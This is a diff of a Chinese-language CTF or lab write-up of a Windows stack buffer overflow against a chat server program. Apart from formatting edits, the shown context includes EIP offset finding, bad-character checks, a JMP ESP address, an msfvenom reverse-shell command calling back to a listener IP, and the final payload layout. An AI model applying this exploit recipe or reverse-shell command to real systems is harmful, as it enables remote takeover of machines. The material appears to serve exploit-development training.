@@ -1,4 +1,4 @@
-Information Gathering（信息收集）  
+1.Information Gathering（信息收集）  
 
 首先对目标主机进行端口扫描，识别开放端口及服务。  
 
@@ -7,6 +7,7 @@ bash nmap -sC -sV <target-ip>
 扫描结果：
 
 21/tcp   open  ftp
+
 9999/tcp open  unknown
 
 📷 端口扫描结果
@@ -87,6 +88,7 @@ nc <win-ip> 9999
 成功连接说明服务正常。
 
 4. Exploitation（漏洞利用）
+   
 4.1 初步溢出测试
 
 连接服务后发现：
@@ -128,6 +130,7 @@ msf-pattern_offset -q 31704330 -l 2500
 结果：
 
 Offset = 2012
+
 4.3 验证 EIP 控制
 
 构造测试 payload：
@@ -159,7 +162,9 @@ EIP = 42424242
 坏字符生成代码：
 
 for x in range(1,256):
+
     print("\\x" + "{:02x}".format(x), end='')
+    
 print()
 
 再次执行 exploit。
@@ -177,6 +182,7 @@ ESP = 0290EEA8
 结果：
 
 Bad Character: \x00
+
 4.5 查找 JMP ESP
 
 查找跳转到栈的指令：
@@ -190,27 +196,41 @@ Bad Character: \x00
 转换为 小端序：
 
 b"\xdf\x14\x50\x62"
+
 4.6 生成 Shellcode
 
 使用 msfvenom 生成反弹 shell：
 
 msfvenom -p windows/shell_reverse_tcp \
+
 LHOST=10.13.16.58 \
+
 LPORT=4444 \
+
 -e x86/shikata_ga_nai \
+
 -b "\x00" \
+
 -f python \
+
 -v payload
 
 参数说明：
 
 参数	作用
+
 -p	payload 类型
+
 LHOST	攻击机 IP
+
 LPORT	监听端口
+
 -e	编码器
+
 -b	排除坏字符
+
 -f	输出格式
+
 4.7 构造最终 Exploit
 
 最终 payload 结构：
@@ -220,7 +240,9 @@ buffer + return address + NOP + shellcode
 示例：
 
 buffer = b"A"*2012
+
 retn = b"\xdf\x14\x50\x62"
+
 nop = b"\x90"*16
 
 payload = buffer + retn + nop + shellcode
@@ -253,22 +275,22 @@ type C:\Users\Administrator\Desktop\flag.txt
 
 完整攻击流程：
 
-1️⃣ 使用 Nmap 扫描端口
+1️ 使用 Nmap 扫描端口
 
-2️⃣ 发现 FTP 匿名登录
+2️ 发现 FTP 匿名登录
 
-3️⃣ 下载 chatserver.exe
+3️ 下载 chatserver.exe
 
-4️⃣ 使用 Immunity Debugger 调试程序
+4️ 使用 Immunity Debugger 调试程序
 
-5️⃣ 发现 message 参数存在缓冲区溢出
+5️ 发现 message 参数存在缓冲区溢出
 
-6️⃣ 使用 Metasploit pattern 计算 EIP 偏移
+6️ 使用 Metasploit pattern 计算 EIP 偏移
 
-7️⃣ 使用 Mona 检测坏字符
+7️ 使用 Mona 检测坏字符
 
-8️⃣ 使用 Mona 查找 jmp esp
+8️ 使用 Mona 查找 jmp esp
 
-9️⃣ 使用 msfvenom 生成 shellcode
+9️ 使用 msfvenom 生成 shellcode
 
-🔟 构造 exploit 并获得 shell
+10 构造 exploit 并获得 shell
